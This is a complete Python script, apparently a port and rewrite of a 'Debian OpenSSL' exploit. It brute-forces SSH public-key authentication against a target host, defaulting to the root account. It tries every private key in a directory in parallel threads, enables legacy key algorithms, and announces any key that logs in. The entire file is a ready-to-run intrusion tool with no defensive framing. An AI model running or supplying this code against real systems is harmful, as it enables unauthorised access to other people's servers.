#!/usr/bin/env python3
# written by snowdroppe, happy hacking n_n

import subprocess, time, os, threading, sys, signal

# config variables - change these as appropriate
# defaults are in the comments in [ ]

config = {
    "host":  "1.2.3.4", # IP address or FQDN
    "port":  "22", # port number of SSH service ["22"]
    "users":  ["root"], # list of usernames to attempt
    "dirs":  ["./"], # list of directories of keys to attempt
                  # (only files without "." will be attempted so .pub is excluded)
    "error_str":  "Permission denied", # expected response for a failed attempt ["Permission denied"]
    "period": 5, # reporting period in seconds [5]
    "threads": 12, # 0 to auto calibrate for highest throughput [12]
    "debug": False # prints attempt info and stder [False]
}

# code - shouldn't need to touch these (adjust cmd if you need extra SSH options)

pool = 0
die = False

class colours:
    green = "\033[92m"
    yellow = "\033[93m"
    red = "\033[91m"
    bold = "\033[1m"
    clear = "\033[0m"

def attempt(config, user, key):
        global pool
        global die
        cmd = ("ssh -l " + user
        + " -p " + config["port"]
        + " -oKexAlgorithms=+diffie-hellman-group1-sha1 "
        + " -oHostKeyAlgorithms=+ssh-dss "
        + " -oHostKeyAlgorithms=+ssh-rsa "
        + " -oPubkeyAcceptedKeyTypes=+ssh-dss "
        + " -oPubkeyAcceptedKeyTypes=+ssh-rsa "
        + " -o PreferredAuthentications=publickey"
        + " -i " + key 
        + " " + config["host"])
        p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
        p.stdin.close()
        err = p.stderr.read().decode("utf-8")
        if config["debug"]: print(user+"@"+config["host"]+":"+config["port"]+" with "+key+" -> "+err, end="")
        if (config["error_str"] not in err and not die):
            print("\a"*4 + "[" + colours.green + colours.bold + "SUCCESS" + colours.clear + "] valid key found: " + key)
            die = True
        else:
            pool += 1
        
def enum_dir(dirs):
    k = []
    for i in dirs:
        j = os.listdir(i)
        k += [i+k for k in j if "." not in k]
    k.sort()
    return k

def suicide(x, y):
    global die
    die = True

def cleanup():
    print("\nKilling orphaned children... ", end="")
    while(len(threading.enumerate()) > 1):
        pass
    print("DONE")
    sys.exit(0)

def main(config):
    print("\n-OpenSSL Debian exploit- by ||WarCat team||, ported to python3,") 
    print("... and then rewritten from scratch because it was kinda shite, by snowdroppe")
    keys = enum_dir(config["dirs"])
    n = len(keys)*len(config["users"])
    print("\nFound %d key(s) and %d username(s) -> %d candidates" % (len(keys), len(config["users"]), n))
    i = 0
    l = 0
    global die
    global pool
    pool = config["threads"]
    start_time = time.time()
    cur_time = time.time()
    print("Starting attack...\n")
    for k in keys:
        for u in config["users"]:
            if (die):
                cleanup()
            while (pool == 0):
                pass
            threading.Thread(target=attempt, args=(config, u, k), daemon=False).start()
            pool -= 1
            i += 1
            l += 1
            if (time.time() > cur_time + config["period"]):
                print("Tested: %d\tRemaining: %d\tElapsed: %dm\tSpeed: %.1f/s\tETA: %dm" %(i,n-i,(time.time()-start_time)/60,l/10,(n-i)/i*(time.time()-start_time)/60))
                cur_time = time.time()
                l = 0
    print("\a"*4 + "[" + colours.red + colours.bold + "FAILURE" + colours.clear + "] all keys exhuasted")
    cleanup()

if (__name__=="__main__"):
    signal.signal(signal.SIGINT, suicide)
    main(config)
